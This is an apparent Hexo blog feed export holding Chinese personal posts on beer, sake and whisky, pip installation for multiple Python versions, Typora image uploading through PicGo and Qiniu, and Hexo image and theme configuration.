title="侍饮温度"></a>侍饮温度</h2><p>通常情况下，主要啤酒种类的最佳侍饮温度为：</p><p>2～4度：绝大部分淡色拉格；</p><p>4～7度：捷克和德式皮尔森、慕尼黑亮色啤酒、小麦啤、科隆啤酒；</p><p>7～10度：各类IPA，美式淡色艾尔、波特和大部分世涛；</p><p>10～13度：比利时艾尔、酸艾尔、博克啤酒、英式苦啤、苏格兰艾尔；</p><p>13～16度：大麦烈酒、帝国世涛、比利时烈性艾尔、双料博克；</p><p>大家可以对号入座，总体思路是：味道越复杂的啤酒需要在越高的温度下品 饮，但最高不要超过20度。</p><h2 id="修道院啤酒"><a href="#修道院啤酒" class="headerlink" title="修道院啤酒"></a>修道院啤酒</h2><ol><li>阿诗（Achel）啤酒，酒厂全称是Brouwerij derSintBenedictusabdij de Achelse Kluis，位于比利时。传统的7家特拉普修道院酒 厂之一，主要有六种产品。</li><li>智美（Chimay），酒厂全称是Brasserie de Chimay，位于比利时。传统7家特拉普修道院酒厂之一，主打四种啤酒，也以制作搭配啤酒的四种奶酪著称。 智美也是第一家把特拉普认证标志打上啤酒商标的酒厂。</li><li>恩格斯塞尔（Engelszell），酒厂全称是Stift Engelszell，位于奥 地利。新晋酒厂之一，目前有三款啤酒。</li><li>拉特拉普（La Trappe），酒厂全称是Brouwerij de Koningshoeven， 位于荷兰。传统7家特拉普修道院酒厂之一，几乎做任何一种啤酒，最大特点是多样 性，也拥有排名第一的产量。</li><li>奥弗（Orval），酒厂全称是Brasserie d’Orval，位于比利时。传统7 家特拉普修道院酒厂之一，基本只酿一款酒对外销售，使用了香料、干投酒花和特 殊酵母，味道极具特色，同时修道院有一款内部版。</li><li>斯宾塞（Spencer），酒厂全称是St. Joseph’s Abbey in Spencer， 位于美国。新晋酒厂之一，风格极具美国特色，主要生产IPA、帝国世涛等。</li><li>罗斯福（Rocherfort），酒厂全称是Brasserie de Rochefort，位于 比利时。最早成立的特拉普修道院酒厂（1595年）拥有6、8、10三款深色啤酒，其 中6是双料，8和10是四料。</li><li>三喷泉（Tre Fontane），酒厂全称是Tre Fontane Abbey，位于意大 利。最新加入的酒厂，特色是加入修道院周边桉树叶的味道，啤酒有着浓郁的药草 味。</li><li>西麦尔（Westmalle），酒厂全称是Brouwerij der Trappisten van Westmalle，位于比利时。第二古老的修道院酒厂，是双料和三料啤酒的创造者， 在修道院啤酒发展历史上有着举足轻重的地位。</li><li>西弗莱特伦（Westvleteren），酒厂全称是Brouwerij Westvleteren/St Sixtus，位于比利时。出产8、10、12三款啤酒，其中12是长 期牢牢占据世界啤酒排名第一的啤酒，一瓶难求。（曾经给西弗莱特伦长期代为酿酒的圣伯纳 （St. Bernardus）酒厂，在西弗莱特伦恢复生产后依旧按照这个配方继续生产圣伯纳12啤酒。这个名气就显然不如西弗莱特伦，但它们之间的质量差别，远远没有 它们的名气差别大。）</li><li>津德尔特（Zundert），酒厂全称是Brouwerij Abdij Maria Toevlucht，位于荷兰。津德尔特是荷兰著名画家梵高的出生地，也是刚加入联盟 的酒厂，目前仅有一款啤酒上市。</li></ol><h2 id="世涛"><a href="#世涛" class="headerlink" title="世涛"></a>世涛</h2><p>爱尔兰世涛（Irish/Dry Stout）：爱尔兰发苦、干爽版本的健力士世涛流行 直到今日，是世界上销量最大的世涛啤酒，这个非常重要，下文单讲。</p><p>牛奶世涛（Milk Stout）：又叫甜世涛或奶油世涛，突出特点是加入乳糖， 酵母无法完全代谢掉，自然酒体浓厚香甜，能量较高，这个其实更像是“液体面 包”，甚至有些美国酒厂会把它叫作“早餐世涛”。</p><p>燕麦世涛（Oatmeal Stout）：在普通世涛里加入了不多于30%的燕麦作为糖 分原料，融合了历史上著名的燕麦苦啤特点，燕麦里蛋白质含量偏高，谷物香味更 足，成为现今世涛家族一大特色。</p><p>巧克力/咖啡世涛（Chocolate/Coffee Stout）：这种世涛一般加入了巧克 力麦芽、可可粉、咖啡冷浸液等，有着非常强烈的黑巧克力味，或者咖啡味道，没 有任何一个喜欢咖啡的人会拒绝这种酒。</p><p>帝国世涛（Imperial Stout）：又叫作“俄罗斯帝国世涛”，加强版的世 涛，历史上专供俄罗斯市场（你懂得，所有味道更加浓重），后来因其独特的酒体 厚重感让人神往，变得异常流行。以至于任何一款酒的极致都是帝国化，比如帝国 IPA、帝国波特，等等。</p><p>牡蛎世涛（Oyster Stout）：一种奇特的啤酒，加入了牡蛎提取物，也是非 常少见的在介绍时会提示不适合素食主义者饮用的酒，发明这种酒类型的伦敦哈默 顿（Hammerton）酒厂也于2014年重新建厂，在努力复现这种啤酒。</p><p>特种世涛（Special Stout）：加入了肉桂、辣椒等成分，用别样的风味刺激 你的味蕾，它的扩展维度就很大了，包括直接使用一些深色果脯发酵，使用霉香酵 母等带来类似马厩味，加入乳酸菌带来酸味，各种别样风味都有可能。 ■　荷兰拉特拉普（La Trappe）修道院酒厂过桶啤酒的一角，现在这已经是很多啤酒厂常见的生产方式</p><p>过桶世涛（Barrel Aged Stout）：世涛口味可能非常厚重，经过其他酒类木 桶的熏陶和陈年，带来的神韵简直无法用只言片语描述。如今，它已成为高端啤酒 的代名词，无数酒厂都开始力推木桶陈酿（在威士忌、白兰地、红酒等酒类的木桶 里陈年发酵）版本，越发高端，陈酿带来的味道也让人沉醉其中。美国的精酿啤酒 运动之后，过桶世涛的中心转移到了美国，在消费主义的推动下做得越发复杂也愈 发昂贵，但只要还有人埋单，这个趋势还会继续下去。</p><hr><blockquote><p>参考：</p><p><a href="https://book.douban.com/subject/30414965/">《啤博士的啤酒札记》</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>微醺日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>啤酒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多版本Python指定pip</title>
    <link href="/posts/741c6074/"/>
    <url>/posts/741c6074/</url>
    
    <content type="html"><![CDATA[<blockquote><p>因为系统中有时需要使用多个版本的Python，对应可能有多个版本的pip。</p><p>在指定与更新过程中之前有点没搞清楚，简单记录。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>如果<code>Ubuntu</code>中已经安装了<code>Python2</code>和<code>Python3</code>。可以通过脚本安装对应的<code>pip</code>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 为Python3安装pipcurl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py -o get-pip.pypython3 get-pip.py --force-reinstall# 为Python2安装pipcurl https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;pip&#x2F;2.7&#x2F;get-pip.py -o get-pip.pypython get-pip.py --force-reinstall</code></pre></div><p>若要为具体版本安装pip将<code>python3 get-pip.py --force-reinstall</code>中的<code>python3</code>换成如<code>python3.5</code>或者<code>python3.6</code>之类的即可。</p><p>通过<code>pip -V</code>或<code>pip3 -V</code>即可查看对应的版本。</p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><p>在安装使用过程中可能产生<code>pip</code>没有对应到<code>python2</code>或者<code>pip3</code>没有对应<code>python3</code>之类的问题。</p><p>可以在<code>/usr/local/bin</code>目录中看到，有很多<code>pip</code>相关的脚本，<code>pip</code>、<code>pip2</code>、<code>pip3</code>等。实际内容都是<code>python</code>脚本。</p><p><strong>例如需要将<code>pip3</code>对应到<code>python3</code>，将脚本第一行的解释器对应到需要的<code>python</code>版本即可。</strong></p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python3# -*- coding: utf-8 -*-import reimport sysfrom pip._internal import mainif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    sys.argv[0] &#x3D; re.sub(r&#39;(-script\.pyw|\.exe)?$&#39;, &#39;&#39;, sys.argv[0])    sys.exit(main())</code></pre></div><p>如果出现<code>ImportError: No module named _internal</code>错误，可能是你修改后的解释器还没有安装<code>pip</code>包，使用前面所述方法进行安装。</p><p><em>另外：直接改这个脚本文件来修改pip对应的python版本的前提是，当前脚本文件对应的Python版本与要修改对应的Python版本的pip包版本最好一致，不一致很可能出错。</em></p><hr><blockquote><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/37473690">https://zhuanlan.zhihu.com/p/37473690</a></p><p><a href="https://bootstrap.pypa.io/">https://bootstrap.pypa.io/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>pip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typora+七牛云图床</title>
    <link href="/posts/d6a29df8/"/>
    <url>/posts/d6a29df8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在<code>Typora</code>中使用七牛云进行云端图床保存图片。</p><p>至于最后我的Hexo博客图片，并没有采用七牛云图床保存，原因参见<a href="https://leex0.top/posts/9e17967/">此文</a>。</p></blockquote><h2 id="1-七牛云"><a href="#1-七牛云" class="headerlink" title="1. 七牛云"></a>1. 七牛云</h2><h3 id="1-1-注册七牛云"><a href="#1-1-注册七牛云" class="headerlink" title="1.1 注册七牛云"></a>1.1 注册七牛云</h3><p>登录<a href="https://www.qiniu.com/">七牛云官网</a>，完成注册相关内容。</p><h3 id="1-2-实名认证"><a href="#1-2-实名认证" class="headerlink" title="1.2 实名认证"></a>1.2 实名认证</h3><p>如果使用免费的存储内容需要进行实名认证，有微信扫码即可完成的比较容易。</p><h3 id="1-3-创建对象存储实例"><a href="#1-3-创建对象存储实例" class="headerlink" title="1.3 创建对象存储实例"></a>1.3 创建对象存储实例</h3><p>在<code>管理控制台</code>中左侧添加<code>对象存储Kodo</code>。需要起一个空间名称与选定一个存储区域，之后都要用相关信息。</p><h3 id="1-4-域名绑定"><a href="#1-4-域名绑定" class="headerlink" title="1.4 域名绑定"></a>1.4 域名绑定</h3><p>需要绑定一个备案的域名（若未备案，覆盖区域则只能为海外）。没有直接绑定的话七牛云会分配一个CDN测试域名可以使用一个月。</p><h2 id="2-Typora"><a href="#2-Typora" class="headerlink" title="2. Typora"></a>2. Typora</h2><p>Typora内置了很多图片上传服务选项iPic、uPic、PicGo、自定义等。</p><p>这里选用了<code>PicGo-Core</code>进行上传。</p><h3 id="2-1-安装PicGo-Core"><a href="#2-1-安装PicGo-Core" class="headerlink" title="2.1 安装PicGo-Core"></a>2.1 安装<code>PicGo-Core</code></h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install picgo -g</code></pre></div><p>安装后可用<code>picgo -h</code>查看说明。</p><h3 id="2-2-修改配置信息"><a href="#2-2-修改配置信息" class="headerlink" title="2.2 修改配置信息"></a>2.2 修改配置信息</h3><p>默认配置文件在<code>~/.picgo/config.json</code>。</p><p>PicGo使用七牛云的相关配置如下：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;  &quot;picBed&quot;: &#123;    &quot;uploader&quot;: &quot;qiniu&quot;,    &quot;qiniu&quot;: &#123;      &quot;accessKey&quot;: &quot;xxxxxxxxxxxxxxx&quot;,      &quot;secretKey&quot;: &quot;aaaaaaaaaaaaaaa&quot;,      &quot;bucket&quot;: &quot;bbbbbbbbbbbbb&quot;, &#x2F;&#x2F; 存储空间名      &quot;url&quot;: &quot;ccccccccccccccc&quot;, &#x2F;&#x2F; 自定义域名      &quot;area&quot;:  &quot;z1&quot;, &#x2F;&#x2F; 存储区域编号      &quot;options&quot;: &quot;&quot;, &#x2F;&#x2F; 网址后缀，比如？imgslim      &quot;path&quot;: &quot;img&#x2F;&quot; &#x2F;&#x2F; 自定义存储路径，比如 img&#x2F;    &#125;  &#125;,  &quot;picgoPlugins&quot;: &#123;&#125;&#125;</code></pre></div><p>其中<code>accessKey</code>与<code>secretKey</code>，在<code>七牛云-&gt;个人中心-&gt;密钥管理</code>处。<code>bucket</code>是<em>1.3</em>中对象存储实例<code>空间名称</code>。<code>url</code>即<em>1.4</em>中的<code>CDN加速/测试域名</code>。<code>area</code>为<em>1.3</em>中的<code>存储区域编号</code>。</p><p>配置好后随便复制一个图片使用<code>picgo upload</code>，即可上传剪贴板最近的图片用以测试上传是否成功。</p><h3 id="2-3-Typora上传服务设置"><a href="#2-3-Typora上传服务设置" class="headerlink" title="2.3 Typora上传服务设置"></a>2.3 Typora上传服务设置</h3><p><code>PicGo-Core</code>的具体使用，我在Typora的图像上传服务中选用的是<code>Custom Command</code>，命令为<code>/usr/local/bin/node /usr/local/bin/picgo upload</code>。具体要看你的工具安装在什么位置了。</p><blockquote><p>按理说命令直接写为<code>picgo upload</code>应该也可以。</p><p>但是我这里会提示<code>bash</code>找不到命令，可能是因为我使用的是<code>zsh</code>，没有深究。同时我也没有在<code>env</code>中写入<code>node</code>。所以全部使用绝对路径即可成功。</p></blockquote><h3 id="2-4-Typora插入图片操作"><a href="#2-4-Typora插入图片操作" class="headerlink" title="2.4 Typora插入图片操作"></a>2.4 Typora插入图片操作</h3><p>可以选为在<strong>插入图片时上传图片</strong>，这样最为方便。</p><p>但会<strong>有一个问题</strong>，如果你只是临时复制进去看，或者需要更换和修改，但你复制进去就已经上传，<strong>在图床中会有临时垃圾文件产生</strong>，维护起来不方便（如果你根本不看只是用当然也不用维护）。</p><p>同时可以勾选上<code>插入时自动转义图片URL</code>。</p><p>但如果我使用的话，还是会选择<strong>插入图片时无操作</strong>，在文件编辑完成后进行<code>格式-&gt;图像-&gt;上传所有本地图片</code>。</p><hr><blockquote><p>参考：</p><p><a href="https://support.typora.io/Upload-Image/">https://support.typora.io/Upload-Image/</a></p><p><a href="https://picgo.github.io/PicGo-Core-Doc/zh/guide/config.html">https://picgo.github.io/PicGo-Core-Doc/zh/guide/config.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Typora</tag>
      
      <tag>七牛云</tag>
      
      <tag>图床</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客图片相关问题</title>
    <link href="/posts/9e17967/"/>
    <url>/posts/9e17967/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Hexo博客图片在本地与推送中显示存在一些问题。自己一些Markdown文档存放组织也有一些问题。</p><p>一些问题与思考都放在这里。</p></blockquote><h2 id="1-问题与需求"><a href="#1-问题与需求" class="headerlink" title="1. 问题与需求"></a>1. 问题与需求</h2><h3 id="1-1-文件组织"><a href="#1-1-文件组织" class="headerlink" title="1.1 文件组织"></a>1.1 文件组织</h3><ul><li>对我使用情况与习惯来讲，<strong>各种Markdown文档应该存放于各处</strong>，如博客文章就应该存放于博客文件夹下，方便推送；各项目文档就应该放在项目所在文件夹下，方便统一查看。</li><li><strong>想要有一个能看到所有文档的界面，超越于文件夹之间的隔离限制</strong>。比如在这个软件中能看到博客文章，也能看到其他文档。</li><li><del>使用<code>MWeb</code>、<code>Bear</code>等管理文档，<strong>文档都在app自建数据库与目录组织之下，不方便不同文件夹下文档管理</strong></del>。更正：实际上MWeb的外部模式能很好的引入本地的文件夹进行文档库类似的管理，非常方便。</li><li>使用<code>Typora</code>编辑文档，<strong>文档组织能力比较弱，不方便跨文件夹来回翻阅文档</strong>（通过最近打开这种方式并不方便，况且没有便签管理、版本控制之类的文档管理额外功能）。</li></ul><h3 id="1-2-图片显示与保存"><a href="#1-2-图片显示与保存" class="headerlink" title="1.2 图片显示与保存"></a>1.2 图片显示与保存</h3><ul><li>由于Hexo自身原因，在编写博客内容时需要使用一个相对路径<code>/image/xx/xxx.png</code>来引用<code>Blog/source/image/xx/xxx.png</code>中存放的图片，这样在generate后博客才能正常显示图片。而这种路径写法下在Typora中并不显示图片。</li></ul><h2 id="2-图片解决办法"><a href="#2-图片解决办法" class="headerlink" title="2. 图片解决办法"></a>2. 图片解决办法</h2><h3 id="2-1-图床（未采用）"><a href="#2-1-图床（未采用）" class="headerlink" title="2.1 图床（未采用）"></a>2.1 图床（未采用）</h3><p>使用图床能够将图片全部以链接形式保存，且不用考虑文件存放相关问题。</p><p>但我的认为，特别是博客，<strong>文档应该和图片放在同一位置，都在自己手中保存最稳妥</strong>，内容量本身也不会太大。</p><p>况且，我使用的<code>GitHub + Hexo</code>的访问展示博客，本身图片能够被推到仓库中，也算是一种图床了。</p><p><strong>最后没有使用图床的方案</strong>。但进行了图床的配置使用（七牛云），有需要的可以参考<a href="https://leex0.top/posts/d6a29df8/">此文</a>。</p><h3 id="2-2-Hexo插件hexo-asset-image（采用）"><a href="#2-2-Hexo插件hexo-asset-image（采用）" class="headerlink" title="2.2 Hexo插件hexo-asset-image（采用）"></a>2.2 Hexo插件<code>hexo-asset-image</code>（采用）</h3><p>使用<a href="CodeFalling/hexo-asset-image">CodeFalling/hexo-asset-image</a>插件。</p><h4 id="2-2-1-Hexo配置post-asset-folder"><a href="#2-2-1-Hexo配置post-asset-folder" class="headerlink" title="2.2.1 Hexo配置post_asset_folder"></a>2.2.1 Hexo配置<code>post_asset_folder</code></h4><p>首先将Hexo配置文件<code>_config.yml</code>中的<code>post_asset_folder</code>选项设置为<code>true</code>。</p><blockquote><p>官网<a href="https://hexo.io/zh-cn/docs/asset-folders">描述</a>：</p><p>对于那些想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上的人来说，Hexo也提供了更组织化的方式来管理资源。这个稍微有些复杂但是管理资源非常方便的功能可以通过将 <code>config.yml</code> 文件中的 <code>post_asset_folder</code> 选项设为 <code>true</code> 来打开。</p><p>当资源文件管理功能打开后，Hexo将会在你每一次通过 <code>hexo new [layout] &lt;title&gt;</code> 命令创建新文章时自动创建一个文件夹。这个资源文件夹将会有与这个文章文件一样的名字。将所有与你的文章有关的资源放在这个关联文件夹中之后，你可以通过相对路径来引用它们，这样你就得到了一个更简单而且方便得多的工作流。</p></blockquote><p>即<code>hexo new</code>新建文章时，会<strong>在文章目录下新建一个文章同名文件夹用来保存该文章相关的图片资源</strong>。（自行创建同名文件夹效果一样）</p><h4 id="2-2-2-使用hexo-asset-image"><a href="#2-2-2-使用hexo-asset-image" class="headerlink" title="2.2.2 使用hexo-asset-image"></a>2.2.2 使用<code>hexo-asset-image</code></h4><p>在配置完上述<code>post_asset_folder</code>选项后，可在文章xx中通过<code>xx/xxx.png</code>或者<code>./xx/xxx.png</code>引用<code>/source/_posts/xx/xxx.png</code>图片资源。</p><p>这种引用方式<strong>在<code>Typora</code>中能展示图片</strong>，这解决了第一步。</p><p>但这种方式下，博客生成推送后不能正常显示图片，所以需要<code>hexo-asset-image</code>插件来<strong>使Hexo在生成博客时能正确产生图片url</strong>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install hexo-asset-image --save</code></pre></div><p>安装插件后，即能通过上述方式引入图片资源，生成博客后也能正常显示图片。</p><h2 id="3-文件组织解决办法"><a href="#3-文件组织解决办法" class="headerlink" title="3. 文件组织解决办法"></a>3. 文件组织解决办法</h2><blockquote><p>接续<em>1.1</em>中的更正：MWeb外部模式能够比较好进行本地的文档管理，且能够指定插入图片的保存位置（可以兼容Hexo默认的图片保存与饮用方式），目前选择照片与文档保存在同一文件夹下管理也算比较方便，就不再换了，保持**<code>post_asset_folder与hexo-asset-image组合方式</code>**。</p></blockquote><p>感觉自己的需求有些麻烦，需要在统一的界面中管理各个文件夹中的文档，而且还需要兼顾博客与博客图片的问题，有些麻烦。最后考虑分别管理。</p><p><del><strong>将<code>Typora</code>作为博客的管理应用，且作为md编辑器。使用MWeb管理其他文档。</strong></del></p><p><del><strong>在写博客时候用<code>Typora</code>打开博客所用的<code>_post</code>目录进行操作编辑。</strong></del></p><p><del><strong>将其他文档都写入<code>MWeb</code>中，进行日常的编写，在需要导出时通过<code>MWeb</code>导出并将文档存放在合适的位置。</strong></del></p><p><del>算是一种折中的办法，且多少有点麻烦，但还没有想好更好的方式。</del></p><p><strong><u>统一采用<code>MWeb</code>进行文档管理，编辑可以采用<code>Typora</code>。</u></strong></p><p>看到有使用<code>Alfred workflow</code>来实现<code>MWeb</code>中的生成文档在<code>Typora</code>中编辑，但这也没有很好的解决我的文件组织问题，所以也没有尝试。</p><hr><blockquote><p>参考：</p><p><a href="https://hexo.io/zh-cn/docs/asset-folders">https://hexo.io/zh-cn/docs/asset-folders</a></p><p><a href="https://www.jianshu.com/p/950f8f13a36c">https://www.jianshu.com/p/950f8f13a36c</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微醺日记——日本酒简单分类</title>
    <link href="/posts/578d8e4a/"/>
    <url>/posts/578d8e4a/</url>
    
    <content type="html"><![CDATA[<p><img src="/posts/578d8e4a/classification.png"></p><h2 id="1-纯米酒系与本酿造酒系"><a href="#1-纯米酒系与本酿造酒系" class="headerlink" title="1. 纯米酒系与本酿造酒系"></a>1. 纯米酒系与本酿造酒系</h2><p>如果清酒的原料只用到<strong>水、米、米曲</strong>，那麽它就属于<code>纯米酒系</code>。</p><p>但如果除了这几样原料之外，还额外添加了cate，那麽它就是<code>本酿造酒系</code>。 </p><p>此外，还可以通过精米步合程度对纯米酒系和本酿造酒系进行进一步的细分。通常纯米酒系的口感比较温和、充满了稻米的鲜味，而本酿造酒系因为添加了酿造酒精的关係，使它的口感变得比较辛辣，很适合搭配料理。</p><h2 id="2-精米步合"><a href="#2-精米步合" class="headerlink" title="2. 精米步合"></a>2. 精米步合</h2><p><img src="/posts/578d8e4a/rice.png"></p><p><code>精米步合</code>指的是把<strong>米外层磨掉了多少，只保留米心</strong>。</p><p>精米步合45%即只保留45%的米心，磨去55%外层。</p><blockquote><p>举例獭祭产品线</p><p>獭祭45：精米步合45%</p><p>三割九分：精米步合39%</p><p>二割三分：精米步合23%</p><p>磨之先驱：精米步合很高就是了</p></blockquote><h2 id="3-酒度"><a href="#3-酒度" class="headerlink" title="3. 酒度"></a>3. 酒度</h2><p>日本<strong>酒度跟酒精度并没有半点关系</strong>！</p><p><code>酒度</code>一般是用来衡量口感的甜度值的，负值越低，说明越甜，喝起来比较甘口；正值越高，说明口感偏顺畅，喝起来会有点微辣。</p><p>而虽然日本酒度可作为口感甜度的判断标准，但口味的甜度也会受到其他因素的影响，因此也不能一概而论。</p><h2 id="4-酸度"><a href="#4-酸度" class="headerlink" title="4. 酸度"></a>4. 酸度</h2><p><code>酸度</code>是用来表示<strong>清酒浓淡的数值</strong>,并不是用来表示酸味的轻重的。数值越高，口感会比较浓郁；数值越低，口感则会比较清淡。</p><h3 id="一合"><a href="#一合" class="headerlink" title="一合"></a>一合</h3><p>一合酒是多少：A quarter即<strong>180ml</strong></p><hr><blockquote><p>参考：</p><p><a href="https://everylittled.com/article/108942">https://everylittled.com/article/108942</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>微醺日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日本酒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo Fluid主题颜色修改</title>
    <link href="/posts/c31bada6/"/>
    <url>/posts/c31bada6/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>Hexo Fluid</code>当前配色下，段内代码显示不明显，更改一下配色。</p><p>更改段内代码配色后顺便修改了配套的超链接配色。</p></blockquote><h2 id="1-定位"><a href="#1-定位" class="headerlink" title="1. 定位"></a>1. 定位</h2><p>段内代码的样式在<code>Blog/node_modules/hexo-theme-fluid/layout/_partial/css.ejs</code>中指明为</p><div class="code-wrapper"><pre class="line-numbers language-css" data-language="css"><code class="language-css">&lt;%- css_ex(theme.static_prefix.github_markdown, &#39;github-markdown.min.css&#39;) %&gt;</code></pre></div><p>其中前缀在<code>Blog/_config.fluid.yml</code>中指明为</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">github_markdown: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;github-markdown-css@4.0.0&#x2F;</code></pre></div><h2 id="2-修改内容"><a href="#2-修改内容" class="headerlink" title="2. 修改内容"></a>2. 修改内容</h2><h3 id="2-1-静态css"><a href="#2-1-静态css" class="headerlink" title="2.1 静态css"></a>2.1 静态css</h3><p>可以将<code>github-markdown.min.css</code>修改后放入<code>Blog/node_modules/hexo-theme-fluid/source/lib/github-markdown</code>。</p><p>在<code>Blog/_config.fluid.yml</code>中指明内部静态位置</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">github_markdown: &#x2F;lib&#x2F;github_markdown</code></pre></div><h3 id="2-2-覆盖"><a href="#2-2-覆盖" class="headerlink" title="2.2 覆盖"></a>2.2 覆盖</h3><p>直接修改<code>Blog/node_modules/hexo-theme-fluid/source/css/_pages/_post/post.styl</code>内容，会覆盖<code>github-markdown.min.css</code>展示。</p><p>此处我仅修改了<code>markdown</code>中段内代码样式，在文件尾增加</p><div class="code-wrapper"><pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus">.markdown-body code&#123;  color #ff7473  background #f4f9ec&#125;</code></pre></div><h2 id="2-3-超链接"><a href="#2-3-超链接" class="headerlink" title="2.3 超链接"></a>2.3 超链接</h2><p>修改段内代码颜色后，想要修改超链接颜色保持一致。</p><p>Fluid的配置文件<code>Blog/_config.fluid.yml</code>中提供选项修改。</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">color:···  # 文章超链接字体色  # Color of post link  post_link_color: &quot;#0366d6&quot;  post_link_color_dark: &quot;#1589e9&quot;# 修改为：color:···  # 文章超链接字体色  # Color of post link  post_link_color: &quot;#8f2d56&quot;  post_link_color_dark: &quot;#1589e9&quot;</code></pre></div><hr><h2 id="2021年08月05日更新"><a href="#2021年08月05日更新" class="headerlink" title="2021年08月05日更新"></a>2021年08月05日更新</h2><p><em>2.2</em>中的修改，会将Code Block中默认颜色修改，会导致Code Block中大面积普通文本变为彩色，重点不突出，目前收回修改，之后有时间看看能不能有更好的方案。</p><div class="code-wrapper"><pre class="line-numbers language-stylus" data-language="stylus"><code class="language-stylus">.markdown-body code&#123;  color #ff7473  background #f4f9ec&#125;</code></pre></div><hr><blockquote><p>参考：</p><p>Fluid配置指南：<a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p><p>颜色搭配：<a href="https://www.webdesignrankings.com/resources/lolcolors/">https://www.webdesignrankings.com/resources/lolcolors/</a></p><p>Fluid mod：<a href="https://github.com/lirengui/hexo-theme-fluid-mod/">https://github.com/lirengui/hexo-theme-fluid-mod/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微醺日记——Whisky拼图</title>
    <link href="/posts/8946ac01/"/>
    <url>/posts/8946ac01/</url>
    
    <content type="html"><![CDATA[<blockquote><p>努力完成Whisky拼图</p><p>持续更新</p></blockquote><p><img src="/posts/8946ac01/whisky.png"></p><h2 id="调和威士忌"><a href="#调和威士忌" class="headerlink" title="调和威士忌"></a>调和威士忌</h2><p><code>Chivas</code>（芝华士）——木质感</p><p><code>JohnnieWalker</code>——主打烟熏</p><p><code>Ballantine&#39;s</code>（百龄坛）——轻烟熏</p><p><code>Label5</code>——轻烟熏，麦芽含量30%较高</p><p><code>Grant&#39;s</code>——酒精强烈，木质单宁重</p><p><code>The Famous Grouse</code>（威雀）——糖糖的，木质单宁</p><p><code>KAKU</code>（角牌）——清淡</p><h2 id="单一麦芽"><a href="#单一麦芽" class="headerlink" title="单一麦芽"></a>单一麦芽</h2><p><code>The Glenlivet</code>（格兰威特）——波本，比较浅的琥珀色，经典的青草味道，青草和奶油味道作为主轴，后调带一些水果的味道 像是青苹果、凤梨，口味算是蛮清新</p><p><code>Macallan</code>（麦卡伦）——雪莉，较深的琥珀色带一点棕红（这也是麦卡伦自己很标榜的the natural color自然酒色 不加焦糖色）</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>微醺日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Whisky</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>微醺日记——清单</title>
    <link href="/posts/19bbe961/"/>
    <url>/posts/19bbe961/</url>
    
    <content type="html"><![CDATA[<blockquote><p>微醺日记——清单</p><p>持续更新</p></blockquote><h2 id="Whisky"><a href="#Whisky" class="headerlink" title="Whisky"></a>Whisky</h2><h3 id="Whisky-Sour（威士忌酸）"><a href="#Whisky-Sour（威士忌酸）" class="headerlink" title="Whisky Sour（威士忌酸）"></a><code>Whisky Sour</code>（威士忌酸）</h3><blockquote><p><code>Daiquiri大吉利</code>——烈酒+柑橘酸+糖浆</p><p>属于酸＋甜结构。更改基酒核心即可（威士忌酸，白兰地酸，金酒酸，伏特加酸等）<a href="https://leex0.top/posts/56b5b661/">参考</a></p></blockquote><p><strong>40ml Whisky + 15ml 蜂蜜糖浆 + 挤半个柠檬</strong> 